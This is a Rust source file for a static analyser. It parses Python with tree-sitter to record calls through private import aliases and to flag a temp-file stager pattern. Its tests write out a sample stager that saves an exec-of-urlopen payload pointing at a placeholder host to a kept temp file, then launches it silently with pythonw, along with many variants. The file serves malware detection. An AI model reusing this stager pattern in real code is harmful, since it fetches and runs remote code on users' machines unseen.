//! Source-local module-scope calls through explicitly imported aliases.
//! This records syntax and bindings, not successful execution or hostile intent.
//! No cross-function, conditional-branch, wildcard-import or dynamic resolution.
use super::named_children;
use crate::{Values, value_key};
use serde_json::{Value, json};
use std::collections::BTreeMap;
use tree_sitter::Node;

const MAX_STATEMENTS: usize = 10_000;
const MAX_CALLS: usize = 1_024;

fn text<'s>(node: Node<'_>, source: &'s str) -> &'s str {
    node.utf8_text(source.as_bytes()).unwrap_or("")
}

#[derive(Clone)]
struct Import {
    target: String,
    alias: String,
    offset: usize,
}

#[derive(Clone, Default)]
struct Temporary {
    remote_url: Option<String>,
    writes: usize,
    closed: bool,
}

/// Records accumulated across a module walk, including nested `try` bodies.
struct Walk {
    calls: Vec<Value>,
    flows: Vec<Value>,
    budget: usize,
}

impl Walk {
    fn new() -> Self {
        Self {
            calls: Vec::new(),
            flows: Vec::new(),
            budget: MAX_STATEMENTS,
        }
    }
}

fn resolved(call: Node<'_>, source: &str, bindings: &BTreeMap<String, Import>) -> Option<String> {
    let function = call.child_by_field_name("function")?;
    let callee = text(function, source);
    let (head, tail) = callee.split_once('.').unwrap_or((callee, ""));
    let binding = bindings.get(head)?;
    if !matches!(function.kind(), "identifier" | "attribute")
        || !callee
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.'))
    {
        return None;
    }
    Some(if tail.is_empty() {
        binding.target.clone()
    } else {
        format!("{}.{}", binding.target, tail)
    })
}

fn arguments(call: Node<'_>) -> Vec<Node<'_>> {
    call.child_by_field_name("arguments")
        .map(|args| named_children(args).collect())
        .unwrap_or_default()
}

fn literal(node: Node<'_>, source: &str) -> Option<String> {
    if node.kind() != "string" {
        return None;
    }
    let raw = text(node, source);
    let quoted = raw.trim_start_matches(['b', 'B', 'r', 'R', 'u', 'U']);
    let prefix = &raw[..raw.len() - quoted.len()];
    if prefix
        .chars()
        .any(|c| !matches!(c, 'b' | 'B' | 'r' | 'R' | 'u' | 'U'))
    {
        return None;
    }
    let delimiter = if quoted.starts_with("\"\"\"") {
        "\"\"\""
    } else if quoted.starts_with("'''") {
        "'''"
    } else if quoted.starts_with('"') {
        "\""
    } else if quoted.starts_with('\'') {
        "'"
    } else {
        return None;
    };
    let body = quoted.strip_prefix(delimiter)?.strip_suffix(delimiter)?;
    Some(if prefix.contains(['r', 'R']) {
        body.to_owned()
    } else {
        super::decode_source_escapes(body)
    })
}

/// Verify the written source itself calls exec on a literal urllib response.
/// No evaluation, guessed imports, aliases across opaque statements or dynamic URLs.
fn remote_eval_url(source: &str) -> Option<String> {
    if source.len() > 64 * 1024 {
        return None;
    }
    let mut parser = tree_sitter::Parser::new();
    parser
        .set_language(&tree_sitter_python::LANGUAGE.into())
        .ok()?;
    let tree = parser.parse(source, None)?;
    if tree.root_node().has_error() {
        return None;
    }
    let mut bindings = BTreeMap::new();
    for statement in named_children(tree.root_node()) {
        if matches!(
            statement.kind(),
            "import_statement" | "import_from_statement"
        ) {
            imports(statement, source, &mut bindings);
        } else if statement.kind() == "expression_statement" {
            let exec = named_children(statement).next()?;
            if exec.kind() != "call"
                || text(exec.child_by_field_name("function")?, source) != "exec"
                || bindings.contains_key("exec")
            {
                return None;
            }
            let [read] = arguments(exec)[..] else {
                return None;
            };
            if read.kind() != "call" || !arguments(read).is_empty() {
                return None;
            }
            let method = read.child_by_field_name("function")?;
            if method.kind() != "attribute"
                || text(method.child_by_field_name("attribute")?, source) != "read"
            {
                return None;
            }
            let fetch = method.child_by_field_name("object")?;
            if fetch.kind() != "call"
                || resolved(fetch, source, &bindings)? != "urllib.request.urlopen"
            {
                return None;
            }
            let [url] = arguments(fetch)[..] else {
                return None;
            };
            if text(url, source).starts_with(['b', 'B']) {
                return None;
            }
            let url = literal(url, source)?;
            if url.starts_with("https://") || url.starts_with("http://") {
                return Some(url);
            }
            return None;
        } else if statement.kind() != "comment" {
            return None;
        }
    }
    None
}

fn temporary_constructor(
    call: Node<'_>,
    source: &str,
    bindings: &BTreeMap<String, Import>,
) -> bool {
    if resolved(call, source, bindings).as_deref() != Some("tempfile.NamedTemporaryFile") {
        return false;
    }
    let mut seen = std::collections::BTreeSet::new();
    let mut retained = false;
    for arg in arguments(call) {
        if arg.kind() != "keyword_argument" {
            return false;
        }
        let Some(name) = arg.child_by_field_name("name") else {
            return false;
        };
        let name = text(name, source);
        if !seen.insert(name) {
            return false;
        }
        let Some(value) = arg.child_by_field_name("value") else {
            return false;
        };
        if name == "delete" {
            retained = value.kind() == "false";
        }
        if name == "mode"
            && !literal(value, source)
                .is_some_and(|mode| mode.contains('b') && mode.contains(['w', 'a']))
        {
            return false;
        }
    }
    retained
}

fn windowless_interpreter(
    node: Node<'_>,
    source: &str,
    bindings: &BTreeMap<String, Import>,
) -> bool {
    if node.kind() != "call" {
        return false;
    }
    let Some(method) = node.child_by_field_name("function") else {
        return false;
    };
    if method.kind() != "attribute"
        || method
            .child_by_field_name("attribute")
            .is_none_or(|n| text(n, source) != "replace")
    {
        return false;
    }
    let Some(object) = method.child_by_field_name("object") else {
        return false;
    };
    let (head, tail) = text(object, source)
        .split_once('.')
        .unwrap_or((text(object, source), ""));
    let Some(import) = bindings.get(head) else {
        return false;
    };
    let interpreter = if tail.is_empty() {
        import.target.clone()
    } else {
        format!("{}.{}", import.target, tail)
    };
    let [old, new] = arguments(node)[..] else {
        return false;
    };
    interpreter == "sys.executable"
        && !text(old, source).starts_with(['b', 'B'])
        && !text(new, source).starts_with(['b', 'B'])
        && literal(old, source).as_deref() == Some(".exe")
        && literal(new, source).as_deref() == Some("w.exe")
}

fn launch_target(
    call: Node<'_>,
    source: &str,
    bindings: &BTreeMap<String, Import>,
) -> Option<String> {
    if resolved(call, source, bindings).as_deref() != Some("os.system") {
        return None;
    }
    let [command] = arguments(call)[..] else {
        return None;
    };
    if command.kind() != "string" || !text(command, source).starts_with(['f', 'F']) {
        return None;
    }
    let mut pieces = named_children(command);
    let start = pieces.next()?;
    if start.kind() != "string_start" {
        return None;
    }
    let command = pieces.next()?;
    if command.kind() != "string_content" || text(command, source) != "start " {
        return None;
    }
    let interpreter = pieces.next()?;
    if interpreter.kind() != "interpolation" || named_children(interpreter).count() != 1 {
        return None;
    }
    let expr = interpreter.child_by_field_name("expression")?;
    if !windowless_interpreter(expr, source, bindings) {
        return None;
    }
    let gap = pieces.next()?;
    if gap.kind() != "string_content" || text(gap, source) != " " {
        return None;
    }
    let file = pieces.next()?;
    if file.kind() != "interpolation" || named_children(file).count() != 1 {
        return None;
    }
    let path = file.child_by_field_name("expression")?;
    if path.kind() != "attribute" || text(path.child_by_field_name("attribute")?, source) != "name"
    {
        return None;
    }
    let object = path.child_by_field_name("object")?;
    if object.kind() != "identifier" {
        return None;
    }
    if pieces.next()?.kind() != "string_end" || pieces.next().is_some() {
        return None;
    }
    Some(text(object, source).to_owned())
}

fn staged_call(
    call: Node<'_>,
    source: &str,
    bindings: &BTreeMap<String, Import>,
    temporaries: &mut BTreeMap<String, Temporary>,
    trigger: &str,
    flows: &mut Vec<Value>,
) {
    if call.kind() != "call" {
        return;
    }
    let mut known_file_call = false;
    if let Some(function) = call.child_by_field_name("function") {
        if function.kind() == "attribute" {
            if let (Some(object), Some(method)) = (
                function.child_by_field_name("object"),
                function.child_by_field_name("attribute"),
            ) {
                if let Some(temp) = temporaries.get_mut(text(object, source)) {
                    known_file_call = true;
                    match text(method, source) {
                        "write" => {
                            temp.writes += 1;
                            temp.remote_url = match arguments(call)[..] {
                                [code]
                                    if temp.writes == 1
                                        && !temp.closed
                                        && text(code, source).starts_with(['b', 'B']) =>
                                {
                                    literal(code, source).and_then(|code| remote_eval_url(&code))
                                }
                                _ => None,
                            };
                        }
                        "close" if arguments(call).is_empty() => {
                            temp.closed = true;
                        }
                        _ => {
                            temp.remote_url = None;
                        }
                    }
                }
            }
        }
    }
    if flows.len() >= MAX_CALLS {
        return;
    }
    if let Some(target) = launch_target(call, source, bindings) {
        if let Some(temp) = temporaries.get(&target) {
            if let Some(url) = &temp.remote_url {
                if temp.closed {
                    flows.push(json!({"kind":"closed_temporary_remote_eval_windowless_launch", "temporary_variable":target, "remote_url":url, "launcher":"os.system", "launcher_private_alias": call.child_by_field_name("function").is_some_and(|n| text(n, source).starts_with('_')), "trigger":trigger, "call_offset":call.start_byte()}));
                }
            }
        }
    } else if !known_file_call {
        // Opaque calls may use the handle, including writes nested in an
        // argument. Do not preserve a verified single-write relationship.
        temporaries.clear();
    }
}

fn imports(statement: Node<'_>, source: &str, bindings: &mut BTreeMap<String, Import>) {
    let from = statement.child_by_field_name("module_name");
    for child in named_children(statement) {
        if from.is_some_and(|module| module.id() == child.id()) {
            continue;
        }
        let (name, alias) = if child.kind() == "aliased_import" {
            let Some(name) = child.child_by_field_name("name") else {
                continue;
            };
            let Some(alias) = child.child_by_field_name("alias") else {
                continue;
            };
            (text(name, source), text(alias, source))
        } else if child.kind() == "dotted_name" {
            let name = text(child, source);
            (name, name.split('.').next().unwrap_or(name))
        } else {
            // Wildcard and malformed imports cannot establish a binding.
            continue;
        };
        let target = if let Some(module) = from {
            format!("{}.{}", text(module, source), name)
        } else if child.kind() != "aliased_import" {
            // `import os.path` binds os, not the full os.path name.
            alias.to_owned()
        } else {
            name.to_owned()
        };
        bindings.insert(
            alias.to_owned(),
            Import {
                target,
                alias: alias.to_owned(),
                offset: child.start_byte(),
            },
        );
    }
}

fn observe(
    call: Node<'_>,
    source: &str,
    bindings: &BTreeMap<String, Import>,
    trigger: &str,
    output: &mut Vec<Value>,
) {
    if output.len() >= MAX_CALLS || call.kind() != "call" {
        return;
    }
    let Some(function) = call.child_by_field_name("function") else {
        return;
    };
    let callee = text(function, source);
    let (head, tail) = callee.split_once('.').unwrap_or((callee, ""));
    let Some(binding) = bindings.get(head) else {
        return;
    };
    if !binding.alias.starts_with('_') {
        return;
    }
    if !matches!(function.kind(), "identifier" | "attribute") {
        return;
    }
    // Only a direct dotted member chain; calls/subscripts in the receiver are
    // unresolved. Whitespace is rejected conservatively rather than normalized.
    if !callee
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.'))
    {
        return;
    }
    let resolved = if tail.is_empty() {
        binding.target.clone()
    } else {
        format!("{}.{}", binding.target, tail)
    };
    output.push(json!({
        "callee": callee,
        "resolved_callee": resolved,
        "alias": binding.alias,
        "import_offset": binding.offset,
        "call_offset": call.start_byte(),
        "trigger": trigger,
    }));
}

fn statements(
    block: Node<'_>,
    source: &str,
    bindings: &mut BTreeMap<String, Import>,
    trigger: &str,
    temporaries: &mut BTreeMap<String, Temporary>,
    walk: &mut Walk,
) {
    for statement in named_children(block) {
        if walk.budget == 0 || walk.calls.len() >= MAX_CALLS {
            break;
        }
        walk.budget -= 1;
        match statement.kind() {
            "comment" => {}
            "import_statement" | "import_from_statement" => {
                imports(statement, source, bindings);
                temporaries.retain(|name, _| !bindings.contains_key(name));
            }
            "expression_statement" => {
                for expression in named_children(statement) {
                    if expression.kind() == "call" {
                        observe(expression, source, bindings, trigger, &mut walk.calls);
                        staged_call(
                            expression,
                            source,
                            bindings,
                            temporaries,
                            trigger,
                            &mut walk.flows,
                        );
                    } else if expression.kind() == "assignment" {
                        if let Some(right) = expression.child_by_field_name("right") {
                            observe(right, source, bindings, trigger, &mut walk.calls);
                            if !temporary_constructor(right, source, bindings) {
                                staged_call(
                                    right,
                                    source,
                                    bindings,
                                    temporaries,
                                    trigger,
                                    &mut walk.flows,
                                );
                            }
                        }
                        if let Some(left) = expression.child_by_field_name("left") {
                            if left.kind() == "identifier" {
                                let name = text(left, source);
                                temporaries.remove(name);
                                if expression
                                    .child_by_field_name("right")
                                    .is_some_and(|right| {
                                        temporary_constructor(right, source, bindings)
                                    })
                                {
                                    temporaries.insert(name.to_owned(), Temporary::default());
                                }
                                bindings.remove(name);
                            } else {
                                bindings.clear();
                                temporaries.clear();
                            }
                        }
                    } else if expression.kind() == "augmented_assignment" {
                        bindings.clear();
                        temporaries.clear();
                    }
                }
            }
            "function_definition" | "class_definition" => {
                if let Some(name) = statement.child_by_field_name("name") {
                    bindings.remove(text(name, source));
                    temporaries.remove(text(name, source));
                }
                // Bodies, decorators and default arguments are not analysed.
            }
            "try_statement" if trigger == "module" => {
                if let Some(body) = statement.child_by_field_name("body") {
                    let mut inner = bindings.clone();
                    let mut inner_temporaries = temporaries.clone();
                    statements(
                        body,
                        source,
                        &mut inner,
                        "module_try",
                        &mut inner_temporaries,
                        walk,
                    );
                }
                // Exceptions may select another branch or skip assignments.
                bindings.clear();
                temporaries.clear();
            }
            _ => {
                // A branch, loop, delete, decorated definition or unsupported
                // statement can overwrite an alias. Never carry it through.
                bindings.clear();
                temporaries.clear();
            }
        }
    }
}

pub(super) fn emit(root: Node<'_>, source: &str, values: &mut Values) {
    let mut walk = Walk::new();
    if !root.has_error() && source.len() <= 2 * 1024 * 1024 {
        statements(
            root,
            source,
            &mut BTreeMap::new(),
            "module",
            &mut BTreeMap::new(),
            &mut walk,
        );
    }
    values.insert_key(
        value_key!("source.python.module_alias_calls"),
        Value::Array(walk.calls),
    );
    values.insert_key(
        value_key!("source.python.literal_tempfile_stager_flows"),
        Value::Array(walk.flows),
    );
    values.insert_key(
        value_key!("source.python.literal_stager_analysis"),
        json!({
            "parse_error": root.has_error(),
            "truncated": source.len() > 2 * 1024 * 1024 || walk.budget == 0,
        }),
    );
}

#[cfg(test)]
mod tests {
    use super::*;
    fn flows(source: &str) -> Vec<Value> {
        let mut parser = tree_sitter::Parser::new();
        parser
            .set_language(&tree_sitter_python::LANGUAGE.into())
            .unwrap();
        let tree = parser.parse(source, None).unwrap();
        assert!(!tree.root_node().has_error(), "{source}");
        let mut walk = Walk::new();
        statements(
            tree.root_node(),
            source,
            &mut BTreeMap::new(),
            "module",
            &mut BTreeMap::new(),
            &mut walk,
        );
        walk.flows
    }
    fn stager() -> &'static str {
        r#"from tempfile import NamedTemporaryFile as _tmp
from sys import executable as _py
from os import system as _run
handle = _tmp(delete=False)
handle.write(b"""from urllib.request import urlopen as _get;exec(_get('https://example.test/stage').read())""")
handle.close()
try: _run(f"start {_py.replace('.exe', 'w.exe')} {handle.name}")
except: pass
"#
    }
    #[test]
    fn proves_written_remote_eval_source_closed_and_same_handle_launched() {
        let observed = flows(stager());
        assert_eq!(observed.len(), 1);
        assert_eq!(observed[0]["remote_url"], "https://example.test/stage");
        assert_eq!(observed[0]["trigger"], "module_try");
        assert_eq!(observed[0]["temporary_variable"], "handle");
        let renamed = stager()
            .replace("_run", "_other")
            .replace("handle", "another");
        assert_eq!(flows(&renamed).len(), 1);
    }
    #[test]
    fn rejects_broken_stager_relationships_and_non_execution_source() {
        for source in [
            stager().replace("{handle.name}", "{other.name}"),
            stager().replace("handle.close()", "print('test')"),
            stager().replace("delete=False", "delete=True"),
            stager().replace("delete=False", "delete=False, delete=True"),
            stager().replace("delete=False", "delete=False, mode='w+'"),
            stager().replace("write(b", "write("),
            stager().replace("{handle.name}", "{handle.name:>80}"),
            stager().replace("replace('.exe', 'w.exe')", "replace(b'.exe', b'w.exe')"),
            stager().replace("handle.write", "other.write"),
            stager().replace("exec(_get", "print(_get"),
            stager().replace("from os import system", "from other import system"),
            stager().replace("from sys import executable", "from other import executable"),
            stager().replace("handle.close()", "handle = other\nhandle.close()"),
            stager().replace(
                "handle.close()",
                "handle.write(b'print(1)')\nhandle.close()",
            ),
            stager().replace("try: _run", "_run = print\ntry: _run"),
            stager().replace(
                "handle.close()",
                "written = handle.write(b'print(1)')\nhandle.close()",
            ),
            stager().replace(
                "handle.close()",
                "print(handle.write(b'print(1)'))\nhandle.close()",
            ),
        ] {
            assert!(flows(&source).is_empty(), "{source}");
        }
    }
    fn calls(source: &str) -> Vec<Value> {
        let mut parser = tree_sitter::Parser::new();
        parser
            .set_language(&tree_sitter_python::LANGUAGE.into())
            .unwrap();
        let tree = parser.parse(source, None).unwrap();
        let mut walk = Walk::new();
        statements(
            tree.root_node(),
            source,
            &mut BTreeMap::new(),
            "module",
            &mut BTreeMap::new(),
            &mut walk,
        );
        walk.calls
    }
    #[test]
    fn binds_private_alias_to_direct_module_and_try_calls() {
        for source in [
            "from os import system as _run\n_run('echo test')",
            "import os as _o\n_o.system('echo test')",
        ] {
            let actual = calls(source);
            assert_eq!(actual.len(), 1);
            assert_eq!(actual[0]["resolved_callee"], "os.system");
            assert_eq!(actual[0]["trigger"], "module");
        }
        let actual = calls("from os import system as _run\ntry: _run('echo test')\nexcept: pass");
        assert_eq!(actual.len(), 1);
        assert_eq!(actual[0]["trigger"], "module_try");
    }
    #[test]
    fn does_not_join_unrelated_calls_shadowed_names_or_inert_text() {
        for source in [
            "from os import system as _run\nprint('test')",
            "from os import system as _run\n_run = print\n_run('test')",
            "from os import system as _run\ndef _run(x): pass\n_run('test')",
            "from os import system as _run\ndef f():\n _run('test')",
            "from os import system as _run\nif __name__ == '__main__':\n _run('test')",
            "from os import system as _run\nif flag: _run = print\n_run('test')",
            "source = \"from os import system as _run; _run('test')\"",
            "from os import system\nsystem('test')",
        ] {
            assert!(calls(source).is_empty(), "{source}");
        }
    }
}
